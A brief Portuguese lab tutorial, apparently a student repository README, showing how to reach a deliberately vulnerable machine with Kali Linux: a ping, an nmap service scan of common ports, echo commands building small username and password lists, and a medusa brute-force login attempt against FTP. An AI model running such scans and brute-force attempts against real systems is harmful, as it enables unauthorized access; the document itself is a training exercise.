# Alcan-ando-maquina-vulneravel-com-o-KALI-LINUX
Alcançando maquina vulneravel com o KALI LINUX



primeiro verificamos se a maquina ta se comunicando e ta acessivel

COMANDO 

ping -c 3 192.168.56.101

( com esse comando pingamos e verificamos se o ip se comunica )

 Apos, fazemos uma verificação com NMAP

COMANDO

nmap -sV -p 21,22,80,445,139 192.168.56.101


esse comando acima ( -p ) ira verificar se as portas indicadas ( 21,22,80,445,139 ) estão disponiveis

o comando ( -sV ) ira ver os serviços que estão rodando em cada porta


como scan acima rodado, vai mostrar as portas abertas, em sistemas ftp e bancos de dados

 

COMANDO

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

comando para criar arquivo com possiveis users


echo -e "123456\npassword\nqerty\nmsfadmin" > pass.txt


COMANDO MEDUSA ( para utilizar os dois txt criados para executar o teste na maquina de loguin e senha e tentar acessar com as senhas e loguins dos arquivos


medusa -h 192.168.56.101 -U users.txt -p pass.txt -M ftp -t 6
